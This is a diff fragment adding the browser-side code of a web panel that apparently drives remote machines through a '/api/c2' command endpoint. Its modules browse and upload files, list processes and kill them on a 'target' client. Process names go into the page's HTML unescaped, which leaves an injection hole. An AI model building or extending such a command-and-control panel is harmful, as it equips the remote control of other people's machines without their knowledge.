+                    if (data && data.type === 'fm_upload_res') {
+                        clearInterval(poll);
+                        if (data.success) { fmSetStatus('Uploaded: ' + file.name, '#22c55e'); fmRefresh(); }
+                        else { fmSetStatus('Error: ' + (data.error || 'failed'), '#ef4444'); fmBusy = false; }
+                    }
+                }, 500);
+            } catch (e) { fmSetStatus('Error: ' + e.message, '#ef4444'); fmBusy = false; }
+            input.value = '';
+        };
+
+        // Auto-load drives when File Manager tab is activated
+        document.querySelectorAll('.module-nav-item').forEach(btn => {
+            if (btn.dataset.module === 'file-manager') {
+                btn.addEventListener('click', () => {
+                    if (document.getElementById('fm-tbody').textContent.includes('Click Refresh')) {
+                        fmNavigateTo('');
+                    }
+                });
+            }
+        });
+
+        // Task Manager
+        window.fetchTaskManagerList = async function() {
+            const tbody = document.getElementById('taskmgr-tbody');
+            const countLbl = document.getElementById('taskmgr-count');
+            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-muted);">Fetching task list...</td></tr>';
+
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'tasklist' })
+                });
+
+                let attempts = 0;
+                const pollTasks = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 20) {
+                        clearInterval(pollTasks);
+                        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--danger,#ef4444);">Timeout loading processes</td></tr>';
+                        return;
+                    }
+                    const r = await fetch('/api/c2/tasklist/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.tasks) {
+                        clearInterval(pollTasks);
+                        countLbl.textContent = data.tasks.length + ' processes';
+                        let html = '';
+                        data.tasks.forEach(t => {
+                            html += `<tr>
+                                <td style="font-family:var(--font-mono);">${t.pid}</td>
+                                <td><b style="color:#fff;">${t.name}</b> ${t.title ? `<span style="font-size:11px;color:var(--text-muted);">(${t.title})</span>` : ''}</td>
+                                <td style="font-family:var(--font-mono);">${t.mem} MB</td>
+                                <td>
+                                    <button class="btn btn-danger" style="padding:4px 8px;font-size:11px;" onclick="killTargetProcess(${t.pid}, '${t.name}')">Kill</button>
+                                </td>
+                            </tr>`;
+                        });
+                        tbody.innerHTML = html;
+                    }
+                }, 500);
+            } catch (err) {
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--danger,#ef4444);">Error: ' + err.message + '</td></tr>';
+            }
+        };
+
+        window.killTargetProcess = async function(pid, name) {
+            if (!confirm(`Kill process ${name} (PID: ${pid})?`)) return;
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'kill:' + pid })
+                });
+                alert(`Kill command sent for ${name} (${pid})`);
+                setTimeout(fetchTaskManagerList, 1000);
+            } catch (err) {
+                alert('Failed to kill process: ' + err.message);
+            }
+        };
+
+        // Mobile sidebar toggle
+        (function() {
+            const toggle = document.getElementById('mobile-menu-toggle');
+            const sidebar = document.getElementById('module-sidebar');
+            const overlay = document.getElementById('mobile-overlay');
+
+            function openSidebar() {
+                sidebar.classList.add('open');
+                overlay.classList.add('visible');
+            }
+
+            function closeSidebar() {
+                sidebar.classList.remove('open');
+                overlay.classList.remove('visible');
+            }
+
+            toggle.addEventListener('click', () => {
+                sidebar.classList.contains('open') ? closeSidebar() : openSidebar();
+            });
+
+            overlay.addEventListener('click', closeSidebar);
+
+            document.querySelectorAll('.module-nav-item').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    if (window.innerWidth <= 768) closeSidebar();
+                });
+            });
+        })();
+
+        // Auth check & init
+        fetch('/api/auth/check').then(r => r.json()).then(data => {
+            if (!data.authenticated) { window.location.href = '/login'; return; }
+            loadClientInfo();
+            setInterval(loadClientInfo, 10000);
+        }).catch(() => { window.location.href = '/login'; });
+    </script>
+</body>
+</html>
